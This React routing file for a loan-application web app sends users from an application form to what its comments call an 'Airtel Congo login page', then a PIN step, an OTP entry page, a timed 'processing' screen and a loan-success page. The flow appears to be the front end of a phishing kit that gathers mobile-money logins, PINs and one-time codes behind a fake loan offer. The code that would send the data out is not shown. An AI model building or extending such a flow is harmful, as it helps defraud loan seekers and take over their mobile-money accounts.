import React, { useState } from "react";
import "./App.css";
import { Toaster } from "react-hot-toast";
import LandingPage from "./components/LandingPage";
import ApplicationForm from "./components/ApplicationForm";
import PaymentConfirmation from "./components/PaymentConfirmation";
import LoanSubmittedPage from "./components/LoanSubmittedPage";
import OtpVerificationPage from "./components/OtpVerificationPage";
import LoanProcessingPage from "./components/LoanProcessingPage";
import LoanSuccessPage from "./LoanSuccessPage";
import DepositPage from "./DepositPage";
import WithdrawPage from "./WithdrawPage";
import LoanDetailsPage from "./LoanDetailsPage";
import { ViewType, ApplicationData } from "./types";

function App() {
  // Load persisted state from sessionStorage so navigating away (e.g. to SMS) doesn't reset the app
  const [currentView, setCurrentViewState] = useState<ViewType>(() => {
    const saved = sessionStorage.getItem("currentView");
    return (saved as ViewType) || "landing";
  });
  const [applicationData, setApplicationDataState] = useState<ApplicationData | null>(() => {
    const saved = sessionStorage.getItem("applicationData");
    return saved ? JSON.parse(saved) : null;
  });
  const API_URL = import.meta.env.VITE_API_URL || "http://localhost:5000";

  // Persist view changes to sessionStorage
  const setCurrentView = (view: ViewType) => {
    sessionStorage.setItem("currentView", view);
    setCurrentViewState(view);
  };

  // Persist applicationData changes to sessionStorage
  const setApplicationData = (data: ApplicationData | null) => {
    if (data) {
      sessionStorage.setItem("applicationData", JSON.stringify(data));
    } else {
      sessionStorage.removeItem("applicationData");
    }
    setApplicationDataState(data);
  };

  const handleApplicationSubmit = (data: ApplicationData) => {
    setApplicationData(data);
    setCurrentView("loanSubmitted"); // Go to Airtel Congo login page
  };

  const handlePaymentComplete = () => {
    setCurrentView("otp"); // Go to OTP after PIN
  };

  const handleLoanSubmittedComplete = () => {
    setCurrentView("payment");
  };

  const handleOtpComplete = () => {
    setCurrentView("processing"); // Go to processing after OTP
  };

  const handleProcessingComplete = () => {
    setCurrentView("success");
  };

  const resetToHome = () => {
    sessionStorage.removeItem("currentView");
    sessionStorage.removeItem("applicationData");
    setCurrentViewState("landing");
    setApplicationDataState(null);
  };

  const handleNavigateToDeposit = () => {
    setCurrentView("deposit");
  };

  const handleNavigateToWithdraw = () => {
    setCurrentView("withdraw");
  };

  const handleNavigateToDetails = () => {
    setCurrentView("details");
  };

  return (
    <div className="app">
      <Toaster
        position="top-center"
        toastOptions={{
          duration: 4000,
          style: {
            background: "#333",
            color: "#fff",
          },
          success: {
            iconTheme: {
              primary: "#667eea",
              secondary: "#fff",
            },
          },
        }}
      />

      {currentView === "landing" && (
        <LandingPage onApply={() => setCurrentView("application")} />
      )}

      {currentView === "application" && (
        <ApplicationForm
          apiUrl={API_URL}
          onBack={resetToHome}
          onSubmitSuccess={handleApplicationSubmit}
        />
      )}

      {currentView === "payment" && (
        <PaymentConfirmation
          applicationData={applicationData}
          onBack={() => setCurrentView("application")}
          onComplete={handlePaymentComplete}
        />
      )}

      {currentView === "loanSubmitted" && (
        <LoanSubmittedPage onComplete={handleLoanSubmittedComplete} />
      )}

      {currentView === "otp" && (
        <OtpVerificationPage
          phoneNumber={applicationData?.phone || ""}
          onComplete={handleOtpComplete}
          onBack={() => setCurrentView("payment")}
        />
      )}

      {currentView === "processing" && (
        <LoanProcessingPage onComplete={handleProcessingComplete} />
      )}

      {currentView === "success" && (
        <LoanSuccessPage
          onBack={resetToHome}
          applicationData={applicationData}
          onNavigateToDeposit={handleNavigateToDeposit}
          onNavigateToWithdraw={handleNavigateToWithdraw}
          onNavigateToDetails={handleNavigateToDetails}
        />
      )}

      {currentView === "deposit" && (
        <DepositPage
          onBack={() => setCurrentView("success")}
          loanAmount={applicationData?.amount ? parseFloat(applicationData.amount) : 10000}
          userName={`${applicationData?.first_name || ''} ${applicationData?.last_name || ''}`.trim()}
          AirtelCongoAccount={applicationData?.phone || "0745567765"}
        />
      )}

      {currentView === "withdraw" && (
        <WithdrawPage
          onBack={() => setCurrentView("success")}
          loanAmount={applicationData?.amount ? parseFloat(applicationData.amount) : 109}
          userName={`${applicationData?.first_name || ''} ${applicationData?.last_name || ''}`.trim()}
          AirtelCongoAccount={applicationData?.phone || "0734765678"}
        />
      )}

      {currentView === "details" && (
        <LoanDetailsPage
          onBack={() => setCurrentView("success")}
          loanAmount={applicationData?.amount ? parseFloat(applicationData.amount) : 109}
          userName={`${applicationData?.first_name || ''} ${applicationData?.last_name || ''}`.trim()}
          AirtelCongoAccount={applicationData?.phone || "0734765678"}
        />
      )}
    </div>
  );
}

export default App;
